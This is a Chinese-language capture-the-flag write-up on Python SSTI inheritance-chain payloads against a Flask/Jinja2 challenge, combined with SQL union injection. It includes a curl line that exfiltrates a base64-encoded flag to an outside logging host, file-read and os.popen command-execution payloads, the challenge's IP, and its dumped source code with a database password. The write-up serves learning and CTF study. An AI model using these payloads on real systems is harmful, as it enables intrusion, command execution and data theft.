
# Forward

​	之前好像打网鼎杯ssti被虐了一次,当时就打算对这个进行一下研究，后来忙忘记最近有个山东省赛的题目又把我折腾了好久，所以这次就下定决心进行一波python继承链的分析和学习  



# 基础知识

```python
().__class__.__bases__[0].__subclasses__()[59].__enter__.__func__.__getattribute__('__global' + 's__')['s'+'ys'].modules['o'+'s'].__getattribute__('sy' + 'stem')("curl i1shpx.ceye.io/`find / -name flag | base64`")
```

```
().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/flag').read()
```

从payload开始分析知识点:

(-1) python一切皆对象 函数是第一对象

(0) dir() 展示对象的属性

(1)  ***()*** 这是python的tuple的一个类实例 类似也有( [] 列表实例)

(2)  \__class__  返回一个实例所属的类 	 `print dir(().__class__)`

(3) \__bases__ 返回一个直接所继承的类(元组形式)

(4)\__subclasses__  获取一个类的子类 返回的是一个列表

(5) \__builtin__ && __builtines 查看当前内存空间支持的函数

(6)\__dict__ 字典的格式列出类或者模块中支持的方法和变量属性

(7)\__getattribute__ 获取函数中所支持的属性 

(8)\__globals__ 返回当前函数或者对象可以访问的全局变量(模块)

(9)\__getattribute__ 访问对象的属性的时候会调用的函数 比如调用t. \___dict___ == t.\__getattribute\____("\___dict__")



# python继承链原理  



类实例 ->类->基类->子类->成员函数->全局变量-linecache module-> 获取os module->执行命令

`[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('ls')`

 
 

# 题目分析  

http://47.105.148.65:29003/?username=

这个点首先

http://47.105.148.65:29003/?username={{ config }}

判断存在ssti

结合题目分析下代码结构:

通过传递用户名然后进入sql查询得到数据然后返回页面 

那么就存在代码是这样的 

username = request.args.get('username')

data = SQL(username)

render_template('index.html',name=username,data=data)

`{% name %} {% data['name']%}`

一开始 直接传入 {{ config }}理论来说应该是查询错误的 但是数据库有返回而且还渲染出了config的内容

我当时就猜测是不是参数进行了一些框架处理 能知道{{}} 要渲染模版 jinja2模版就是这样

然后针对	`username={{可控点}}` 进行了测试  然后发现各种不行 

后来我就随手打了个单引号 发现了个注入 然后看了下表结构没有什么有价值的东西

后来转念想想 这个可以union注入 也就是数据库返回内容我们可以控制 考虑之前假设的代码结构说明这个点也可能存在ssti

```python
http://47.105.148.65:29003/?username=-1' union select 1,'{{config}}',1#
```

发现的确如此 然后

```python
http://47.105.148.65:29003/?username=-1' union select 1,'{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__["open"]("/flag").read()}}',1#
```

便可以获取到flag



# 加深研究

​	由于做的时候感觉很多都是猜测而且和假设很多出入,所以打算拿源代码进行看看

 由之前的payload很容易想到

```python
http://47.105.148.65:29003/?username=-1' union select 1,'{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__["open"](__file__).read()}}',1%23
```

发现出现了render error 

当时考虑了 猜测两种可能

(1)替换了_\_file__  ->`{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__["open"]().read()}}`

(2)返回内容过长或者没办法读取

*验证猜想*

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__["open"](__file__).read()[:10].encode('hex')}}
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__["open"]('/flag').read()[:10].encode('hex')}}
```

发现不是内容过长问题 那么是不是替换了file了

然后尝试将payload进行hexcode编码在union 发现还是不行 那么也不可能 那么是不是不能读取呢 

————这个坑没弄懂-----------------------------

打算读取下源代码分析下:

获取当前文件名:

`{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").path.abspath(__file__)')}}`

得到

`/usr/local/lib/python2.7/dist-packages/jinja2/runtime.pyc`

很明显就是这个不是源代码 是传参数进去调用的



后来搞了个命令执行的payload 获取路径的payload

```python
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('str(__import__("os").listdir("/")).encode("hex")')}}
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('str(__import__("os").system("whoami")')}}
{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('str(__import__("os").list("/"))')}}
```

但是返回的是个整形 (由于自己太菜当时没想到去研究下,后来经过郁离歌师傅的指导知道了popen这个函数可以读取返回 这样就是个伪shell了)

回到我的思路来:

​	当时想通过外带查询把结果导出来 然后试了curl url 发现进程被中断 估计做了出站处理 所以说只能搞正向shell了

[python正向连接后门](https://www.leavesongs.com/python/python-shell-backdoor.html)  这个参考了p神的代码,那么思路就出来了

(1) /tmp 目录可写 那么可以通过编码||分段写进去 然后eval执行(再次膜拜郁师傅)

(2)直接组合成一句话 eval执行(* 这个点后续研究)



## 解决命令无结果回显问题  

**os.system() 和 os.open()两者的区别**:  

查阅文档 [os官方文档](https://docs.python.org/2/library/os.html)

> - `os.``system`(*command*)
>
>   Execute the command (a string) in a subshell. This is implemented by calling the Standard C function `system()`, and has the same limitations. Changes to [`sys.stdin`](https://docs.python.org/2/library/sys.html#sys.stdin), etc. are not reflected in the environment of the executed command.On Unix, the return value is the exit status of the process encoded in the format specified for [`wait()`](https://docs.python.org/2/library/os.html#os.wait). Note that POSIX does not specify the meaning of the return value of the C `system()` function, so the return value of the Python function is system-dependent.On Windows, the return value is that returned by the system shell after running *command*, given by the Windows environment variable `COMSPEC`: on**command.com** systems (Windows 95, 98 and ME) this is always `0`; on **cmd.exe** systems (Windows NT, 2000 and XP) this is the exit status of the command run; on systems using a non-native shell, consult your shell documentation.The [`subprocess`](https://docs.python.org/2/library/subprocess.html#module-subprocess) module provides more powerful facilities for spawning new processes and retrieving their results; using that module is preferable to using this function. See the [Replacing Older Functions with the subprocess Module](https://docs.python.org/2/library/subprocess.html#subprocess-replacements) section in the [`subprocess`](https://docs.python.org/2/library/subprocess.html#module-subprocess) documentation for some helpful recipes.Availability: Unix, Windows.

```
Changes to sys.stdin, etc. are not reflected in the environment of the executed command.On Unix, the return value is the exit status of the process encoded in the format specified for wait()
```


这里看出来了标准输入 输出等等不会返回在终端 返回exit status code    

>
>
>`os.``popen`(*command*[, *mode*[, *bufsize*]])
>
>Open a pipe to or from *command*. The return value is an open file object connected to the pipe, which can be read or written depending on whether *mode* is `'r'` (default) or `'w'`. The *bufsize* argument has the same meaning as the corresponding argument to the built-in [`open()`](https://docs.python.org/2/library/functions.html#open) function. The exit status of the command (encoded in the format specified for [`wait()`](https://docs.python.org/2/library/os.html#os.wait)) is available as the return value of the [`close()`](https://docs.python.org/2/library/stdtypes.html#file.close) method of the file object, except that when the exit status is zero (termination without errors), `None` is returned.
>
>Availability: Unix, Windows.
>
>Deprecated since version 2.6: This function is obsolete. Use the [`subprocess`](https://docs.python.org/2/library/subprocess.html#module-subprocess) module. Check especially the [Replacing Older Functions with the subprocess Module](https://docs.python.org/2/library/subprocess.html#subprocess-replacements) section.
>
>Changed in version 2.0: This function worked unreliably under Windows in earlier versions of Python. This was due to the use of the `_popen()`function from the libraries provided with Windows. Newer versions of Python do not use the broken implementation from the Windows libraries.

可以看到是开启一个管道去读取命令的输入输出流然后返回一个文件对象 文件读写的权限由mode决定

*所以获取的源码payload:*

1.`{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("pwd").read()')}}`

2.`{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}`

获取到文件名`app.py`

3.直接cat是不行的会渲染错误 因为文件有特殊字符 所以考虑编码一下

`{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat app.py | base64").read()')}}`

4.解码获取到原文件

```python
# -*- coding: utf-8 -*-

"""
@version: ??
@author: luyx
@file: flask_sql_injection.py
@time: 5/21/18 12:30 AM
"""


import pymysql
import re
from flask import Flask, url_for, Blueprint, request, render_template_string
from flask_script import Manager


app = Flask(__name__)
portal = Blueprint('portal', __name__)


def db_client(query, method="GET"):
    conn = pymysql.connect(host='localhost',
                           user='ctf',
                           password='L5C#^taVOMMdfNh3',
                           port=3306,
                           db='ctf',
                           charset='utf8mb4',
                           autocommit=True,
                           cursorclass=pymysql.cursors.SSDictCursor)
    cursor = conn.cursor()
    try:
        cursor.execute(query)
        result = 'query executed.'
        if method == "GET":
            result = cursor.fetchall()
        conn.close()
        return result, 'OK'
    except Exception, e:
        conn.close()
        return e, 'ERROR'


def int2str(data):
    numbers = re.findall(string=data, pattern='\d+')
    numbers = list(set(numbers))
    for each in numbers:
        data = data.replace(each, '"'+each+'"')
    return data


@portal.route('/', methods = ['POST', 'GET'])
def index():
    if request.method == 'GET':
        args = request.args.to_dict()
        sql_string = """
        select * from comment where username='%s'
        """ % args.get('username')
        result, status = db_client(query=sql_string, method=request.method)
        page_data = 'NO DATA'
        if status == 'ERROR':
            # page_data = result
            page_data = 'Mysql Error.'
        elif status == 'OK':
            page_data = ''
            for each in result:
                page_data += """
                <tr>
                <td align=center>%s</td>
                <td align=center>%s</td>
                <td align=center>%s</td>
                </tr>
                """ % (each.get('id','EMPTY'),each.get('username','EMPTY'),each.get('comment','EMPTY'))
        else:
            pass
        page_template = """
        <html>
                <head>
                        <meta charset="utf-8">
                        <meta name="viewport" content="width=device-width,initial-scale=1.0">
                        <title>Easy Flask</title>
                        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
                        <link type="text/css" rel="stylesheet" href="static/style.css"/>
                </head>
                <body>
                        <div class="form_wrap">
                                <div class="wrap">
                                        <h1>
                                                Add a Comment:
                                        </h1>
                                        <form action="/" method="post">
                                                <div class="input_line">
                                                        <label for="" class="label_name">Username: </label>
                                                        <input type="text" name="username" size="50" placeholder="username" />
                                                </div>
                                                <div class="input_line">
                                                        <label for="" class="label_name">Comment:</label> 
                                                        <input type="text" name="comment" size="50" placeholder="comment" />
                                                </div>
                                                <input type="submit" value="Submit" />
                                        </form>
                                </div>
                                
                                <div class="wrap">
                                        <h1>
                                                Search Comments:
                                        </h1>
                                        <div>
                                                <form action="/" method="GET">
                                                        <div>
                                                                <label for="" class="label_name">Username: </label>
                                                                <input type="text" name="username" size="50" placeholder="search comment by username" />
                                                        </div>
                                                        <input type="submit" value="Submit" />
                                                </form>
                                        </div>
                                </div>
                                <div class="wrap">
                                        <h1>
                                                Show Comments:
                                        </h1>
                                        <table border="1" width="100" height="60" class="table table-bordered">
                                                <thead>
                                                        <tr>
                                                                <th>id</th>
                                                                <th>username</th>
                                                                <th>comment</th>
                                                        </tr>
                                                </thead>
                                                <tbody>
                                                        %s
                                                </tbody>
                                        </table>
                                </div>
                        </div>
                </body>
        </html>
        """
        page = page_template % page_data
        try:
            rendered = render_template_string(page)
        except Exception, e:
            # rendered = render_template_string(page_template % e)
            rendered = render_template_string(page_template % 'Rendering Error.')
        return rendered
    if request.method == 'POST':
        args = request.form
        username = args.get('username')
        username = int2str(username)
        comment = args.get('comment')
        comment = int2str(comment)
        sql_string = """
        insert into comment (`username`,`comment`) value 
        ('%s', '%s')
        """ % (username, comment)
        msg, status = db_client(query=sql_string, method=request.method)
        if status == 'OK':
            return 'comment added.'
        else:
            # return str(msg)
            return 'Mysql Error.'

try:
    app.config.from_pyfile("config.py")
    print "**Loaded config from config.py."
except Exception, e:
    print "**Cannot load external config, make sure you have config.conf in app's root path. (%s)" % str(e)
    print "**Using built-in default settings!"

manager = Manager(app)

app.register_blueprint(portal)


@app.template_filter('date_format')
def date_format(time_str):
    try:
        return time_str.strftime("%Y-%m-%d %H:%M:%S")
    except:
        return "--"


@manager.command
def debug():
    '''Run a debug server.'''
    # 模板文件修改后自动重载
    import os
    from os import path
    extra_dirs = ['templates/', ]
    extra_files = extra_dirs[:]
    for extra_dir in extra_dirs:
        for dirname, dirs, files in os.walk(extra_dir):
            for filename in files:
                filename = path.join(dirname, filename)
                if path.isfile(filename):
                    extra_files.append(filename)

    config = dict(debug=True, host='0.0.0.0', threaded=True, port=8082, extra_files=extra_files)
    app.run(**config)


@manager.command
def run():
    '''Run server with debug disabled.'''
    config = dict(debug=False, host='0.0.0.0', threaded=True, port=8082)
    app.run(**config)


@manager.command
def routes():
    import urllib
    output = []
    for rule in app.url_map.iter_rules():
        options = {}
        for arg in rule.arguments:
            options[arg] = arg #"[{0}]".format(arg)
            if arg=="page":
                options[arg] = 1
        methods = ','.join(rule.methods)
        url = url_for(rule.endpoint, **options)
        line = urllib.unquote("{:40s} {:25s} {}".format(rule.endpoint, methods, url))
        output.append(line)
    for line in sorted(output):
        print line

if __name__ == '__main__':
    manager.run()

```



# 审计代码分析出题思路

```python
sql_string = """
        select * from comment where username='%s'
        """ % args.get('username')
        result, status = db_client(query=sql_string, method=request.method)
        page_data = 'NO DATA'
        if status == 'ERROR':
            # page_data = result
            page_data = 'Mysql Error.'
        elif status == 'OK':
            page_data = ''
            for each in result:
                page_data += """
                <tr>
                <td align=center>%s</td>
                <td align=center>%s</td>
                <td align=center>%s</td>
                </tr>
                """ % (each.get('id','EMPTY'),each.get('username','EMPTY'),each.get('comment','EMPTY'))
```

我的猜测还是正确的是查询sql结果作为模版参数拼接进去了

`(each.get('id','EMPTY'),each.get('username','EMPTY'),each.get('comment','EMPTY'))`

然后

```python
        try:
            rendered = render_template_string(page)
        except Exception, e:
            # rendered = render_template_string(page_template % e)
            rendered = render_template_string(page_template % 'Rendering Error.')
        return rendered
```

用`render_template_string`渲染 (ps 这个没有进行xss过滤 会有xss存在 记录下)



然后回溯下 之前为啥传入{{ config }} 从代码来看是不可能的 那么问题就出现在数据库上

存在一个username: {{config}} 然后有config的内容的 数据 

![image-20181110183145644](https://ws2.sinaimg.cn/large/006tNbRwgy1fx35b1nozbj30r205g41u.jpg)



做到这里很多问题就已经得到解答了 从数据库插入时间来看 应该是某个大佬无聊搞事情



# End

​	针对这道题一方面是我菜,还有一方面我想对那些喜欢搞事情的大佬希望能给我们这些菜鸡一点生存空间,让出题的本意不被误导,上次慕测那个省赛dedecms被改密码当时我就懵b，连这道题都做不出来，那300分的估计不用做了，一方面经验主义的锅，一方面大佬的锅，一方面出题人的锅，最后化整为0。 学习是进行时,希望能认识更多的大佬，让大佬带我飞。 
